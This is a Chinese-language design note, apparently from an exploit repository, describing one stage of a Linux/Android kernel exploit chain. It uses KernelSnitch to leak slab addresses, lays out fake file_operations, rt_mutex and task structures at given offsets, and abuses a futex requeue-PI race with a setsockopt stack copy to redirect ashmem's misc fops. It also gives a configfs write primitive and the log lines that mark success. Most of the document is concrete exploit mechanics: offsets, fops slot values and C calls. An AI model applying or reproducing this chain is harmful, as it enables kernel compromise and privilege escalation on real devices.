# 03. mm/slab、payload 与 3.1 路由闭环

3.1 路由的目标很窄：把 `dashmem_misc.fops` 临时路由到当前页内的 fake fops 表，触发后立即写回原始 `ashmem_fops`，最后用 `route-summary` 给出观测结果。

## mm/slab 定位

`rc_prepare_fops_page()` 的定位步骤：

1. fork 多组 clone child，打开 `/proc/<pid>/mem`，制造可回收的 `mm_struct` 布局。
2. 调用 KernelSnitch：`kernelsnitch_setup()`、`kernelsnitch_find_collisions()`、`kernelsnitch_bruteforce()`。
3. 取回泄露的 `mm_struct` 地址。
4. 用 `leaked & ~0x7fff` 对齐到 order-3 slab 基址。

关键日志：

```text
[*] prepare_kernel_page geom ... mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
[*] kernelsnitch collision-scan leaked mm=...
```

`PAGE_PREP_SLABS` 默认是 `16`。supervisor 第一次失败后，后续 worker 会把它调到 `32`，只影响预铺规模。

## payload 布局

`rc_prepare_skb_payload()` 会在同一 slab 页内准备两份 32 KiB chunk，`RC_IMG_BIAS=0xe80` 对齐到后续 sk_buff copy 的落点。

| 名称 | 偏移 | 用途 |
| --- | ---: | --- |
| `RC_FOPS_OFF` | `0x1000` | fake `file_operations` 表 |
| `RC_LOCK_OFF` | `0x1350` | fake rt_mutex lock |
| `RC_SCRATCH_OFF` | `0x1700` | configfs write window scratch 区 |
| `RC_W0_OFF` | `0x2220` | fake top waiter |
| `RC_RIGHT_OFF` | `0x4440` | rb-tree route 右节点 |
| `RC_LEFT_OFF` | `0x5560` | rb-tree route 左节点 |
| `RC_TASK_OFF` | `0x5800` | fake task_struct 最小字段 |

fake fops 表只填当前 route 用到的槽位：

| fops slot | 值 |
| --- | --- |
| `.llseek` | `fake_w0 + 24` |
| `.read` | `configfs_read_bin_file.cfi_jt` |
| `.write` | `configfs_write_bin_file.cfi_jt` |
| `.unlocked_ioctl` | `ashmem_ioctl.cfi_jt` |
| `.compat_ioctl` | `compat_ashmem_ioctl.cfi_jt` |
| `.mmap` | `ashmem_mmap.cfi_jt` |
| `.open` | `ashmem_open.cfi_jt` |
| `.release` | `ashmem_release.cfi_jt` |
| `.splice_read` | `generic_file_splice_read.cfi_jt` |
| `.show_fdinfo` | `ashmem_show_fdinfo.cfi_jt` |

payload 自检会读取两份 chunk 的 lock、waiter、task、fops 字段；任一字段不匹配时直接退出。

## route 触发

`rc_run_main_route_threads()` 启动三类线程：

- waiter：先持有 `rc_f_pi_chain`，然后进入 `FUTEX_WAIT_REQUEUE_PI`。
- owner：持有 `rc_f_pi_target`，再尝试锁 `rc_f_pi_chain`，制造 PI chain。
- consumer：等待 IP route 放行后，对 waiter tid 调用 `sched_setattr()`。

主线程调用：

```c
futex_op(&rc_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &rc_f_pi_target, 0);
```

waiter 随后进入 `rc_slide_ip_stack_copy()`，用 `setsockopt(MCAST_JOIN_GROUP)` 的内核栈 copy 形成 overlay。overlay 的 `tree_entry` 指向 `ASHMEM_MISC_FOPS_ALIAS - 8`，右节点值为 fake fops 地址。

## restore 与 route-summary

route 后 worker 重新打开 ashmem，借 fake fops 中的 configfs write window 把 `dashmem_misc.fops` 写回：

```c
uint64_t misc_fops = text_addr(ASHMEM_MISC_FOPS);
uint64_t original = kaslr_base + ASHMEM_FOPS_OFF;
rc_configfs_write_once(afd, misc_fops, &original, 8);
```

成功闭环的判定是：

```text
[*] misc.fops restore ... ret=8 errno=0
[+] misc.fops restored to ashmem_fops
[+] route-summary ... kaslr=1 ... route_done=1
```

这就是 3.1 的结束点。当前仓库不会继续进入第二阶段。
